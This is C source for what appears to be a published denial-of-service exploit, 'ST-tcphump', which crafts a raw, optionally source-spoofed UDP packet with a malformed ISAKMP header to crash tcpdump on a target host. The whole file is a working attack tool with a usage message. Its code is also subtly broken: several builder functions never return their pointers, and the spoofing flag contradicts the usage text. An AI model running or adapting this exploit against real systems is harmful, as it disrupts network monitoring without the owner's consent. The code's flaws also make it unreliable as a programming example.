#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <linux/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <sys/socket.h>
#include <unistd.h>

#define ISAKMPGEN_SIZE sizeof(struct isakmpgen)
#define ISAKMPHEAD_SIZE sizeof(struct isakmphdr)
#define PSDHEAD_SIZE sizeof(struct pseudohdr)
#define UDPHEAD_SIZE sizeof(struct udphdr)
#define IPHEAD_SIZE sizeof(struct iphdr)
#define PORT 80

struct isakmpgen * isakmpg(void);
struct isakmphdr * isakmph(void);
struct udphdr * udph(void);
struct iphdr * iph(void);
__u16 cksum(__u16 *buf, int nbytes);
void get_interface(void);
void usage(void);

struct isakmpgen {
  __u8 np;
  __u8 reserved;
  __u16 length;
};

struct isakmphdr {
  __u8 i_ck[8];
  __u8 r_ck[8];
  __u8 np;
  __u8 vers;
  __u8 etype;
  __u8 flags;
  __u8 msgid[4];
  __u32 len;
};

struct pseudohdr {
  __u32 saddr;
  __u32 daddr;
  __u8 zero;
  __u8 protocol;
  __u16 length;
};

struct sockaddr_in saddr;
struct sockaddr_in local;
int spoof;

int main(int argc, char *argv[]) {
  char *packet = malloc(4096);
  char *pseudo = malloc(4096);
  struct isakmpgen *isakmpgen = malloc(ISAKMPGEN_SIZE);
  struct isakmphdr *isakmp = malloc(ISAKMPHEAD_SIZE);
  struct pseudohdr *phdr = malloc(PSDHEAD_SIZE);
  struct udphdr *udp = malloc(UDPHEAD_SIZE);
  struct iphdr *ip = malloc(IPHEAD_SIZE);
  int sock = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
  int one = 1;
  const int *val = &one;
  
  printf("ST-tcphump tcpdump ISAKMP denial of service\n");
  printf(" The Salvia Twist\n");
  
  if(argc < 2) {
    usage();
    exit(1);
  }
  
  if(!strcmp(argv[1], "-s"))
    spoof = 0;
  else {
    spoof = 1;
    get_interface();
  }
      
  if(!spoof && argc < 3) {
    usage();
    exit(1);
  }
  
  bzero(packet, sizeof(packet));
  bzero(pseudo, sizeof(pseudo));
  srand(time(NULL));
  
  saddr.sin_family = AF_INET;
  saddr.sin_port = htons(PORT);
  
  if(spoof)
    saddr.sin_addr.s_addr = inet_addr(argv[1]);
  else
    saddr.sin_addr.s_addr = inet_addr(argv[2]);
  
  setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one));
  
  ip = iph();
  udp = udph();
  isakmp = isakmph();
  isakmpgen = isakmpg();
  
  memcpy(&phdr->saddr, &ip->saddr, 4);
  memcpy(&phdr->daddr, &ip->daddr, 4);
  phdr->protocol = 17;
  phdr->length = htons(UDPHEAD_SIZE + ISAKMPHEAD_SIZE + ISAKMPGEN_SIZE);
  
  memcpy(pseudo, phdr, PSDHEAD_SIZE);
  memcpy(pseudo + PSDHEAD_SIZE, udp, UDPHEAD_SIZE);
  memcpy(pseudo + PSDHEAD_SIZE + UDPHEAD_SIZE, isakmp, ISAKMPHEAD_SIZE);
  memcpy(pseudo + PSDHEAD_SIZE + UDPHEAD_SIZE + ISAKMPHEAD_SIZE,
      isakmpgen, ISAKMPGEN_SIZE);
  
  udp->check = cksum((u_short*) pseudo, PSDHEAD_SIZE + UDPHEAD_SIZE +
      ISAKMPHEAD_SIZE + ISAKMPGEN_SIZE);
  
  memcpy(packet, ip, IPHEAD_SIZE);
  memcpy(packet + IPHEAD_SIZE, udp, UDPHEAD_SIZE);
  memcpy(packet + IPHEAD_SIZE + UDPHEAD_SIZE, isakmp, ISAKMPHEAD_SIZE);
  memcpy(packet + IPHEAD_SIZE + UDPHEAD_SIZE + ISAKMPHEAD_SIZE,
      isakmpgen, ISAKMPGEN_SIZE);
    
  ip->check = cksum((u_short*) packet, ip->tot_len >> 1);
  memcpy(packet, ip, IPHEAD_SIZE);

  if(sendto(sock, packet, ip->tot_len, 0, (struct sockaddr *) &saddr,
        sizeof(saddr)) < 0) {
    printf("sendto error\n");
    exit(1);
  }
  
  printf("Packet sent.\n");
  
  return 0;
}

void usage(void) {
  printf("\nUsage: ST-tcphump -s <target addr>\n");
  printf("\t-s\tdon't spoof source address\n");
}

__u16 cksum(__u16 *buf, int nbytes) {
  __u32 sum;
  __u16 oddbyte;

  sum = 0;
  while(nbytes > 1) {
    sum += *buf++;
    nbytes -= 2;
  }

  if(nbytes == 1) {
    oddbyte = 0;
    *((__u16 *) &oddbyte) = *(__u8 *) buf;
    sum += oddbyte;
  }

  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);

  return (__u16) ~sum;
}

struct isakmpgen * isakmpg(void) {
  struct isakmpgen *isakmpg = malloc(ISAKMPGEN_SIZE);

  bzero(isakmpg, ISAKMPGEN_SIZE);
  isakmpg->np = 69;
}

struct isakmphdr * isakmph(void) {
  struct isakmphdr *isakmph = malloc(ISAKMPHEAD_SIZE);
  int i;
  
  bzero(isakmph, ISAKMPHEAD_SIZE);
  for(i = 0; i < 8; i++) {
    isakmph->i_ck[i] = rand() % 256;
    isakmph->r_ck[i] = rand() % 256;
  }
  for(i = 0; i < 4; i++)
    isakmph->msgid[i] = rand() % 256;
  isakmph->vers = 0x8 << 4 | 0x9;
  isakmph->np = 69;
  isakmph->etype = 2;
  isakmph->len = htonl(ISAKMPHEAD_SIZE + ISAKMPGEN_SIZE);
}

struct udphdr * udph(void) {
  struct udphdr *udph = malloc(UDPHEAD_SIZE);

  udph->source = htons(PORT);//htons(1024 + (rand() % 2003));
  udph->dest = htons(PORT);
  udph->len = UDPHEAD_SIZE + ISAKMPHEAD_SIZE + ISAKMPGEN_SIZE;
  udph->check = 0;
}

struct iphdr * iph(void) {
  struct iphdr *iph = malloc(IPHEAD_SIZE);

  iph->ihl = 5;
  iph->version = 4;
  iph->tos = 0;
  iph->tot_len = IPHEAD_SIZE + UDPHEAD_SIZE + ISAKMPHEAD_SIZE + 
    ISAKMPGEN_SIZE;
  iph->id = htons(rand());
  iph->frag_off = 0;
  iph->ttl = 225;
  iph->protocol = 17;
  iph->check = 0;

  if(spoof) {
    iph->saddr = saddr.sin_addr.s_addr;
  }
  else
    iph->saddr = local.sin_addr.s_addr;
  
  iph->daddr = saddr.sin_addr.s_addr;
  
  return iph;
}

/* thanks hping2 */
void get_interface(void) {
  int sockr, len, on = 1;
  struct sockaddr_in dest;
  struct sockaddr_in iface;

  memset(&iface, 0, sizeof(iface));
  memcpy(&dest, &saddr, sizeof(struct sockaddr_in));
  dest.sin_port = htons(11111);

  sockr = socket(AF_INET, SOCK_DGRAM, 0);

  if(setsockopt(sockr, SOL_SOCKET, SO_BROADCAST, &on, sizeof(on)) == -1) {
    printf("getsockopt error\n");
    exit(1);
  }

  if(connect(sockr, (struct sockaddr *)&dest,
        sizeof(struct sockaddr_in)) == -1) {
    printf("connect error\n");
    exit(1);
  }

  len = sizeof(iface);
  if(getsockname(sockr, (struct sockaddr *)&iface, &len) == -1) {
    printf("getsockname error\n");
    exit(1);
  }
  
  close(sockr);
  memcpy(&local, &iface, sizeof(struct sockaddr_in));
  return;
} 
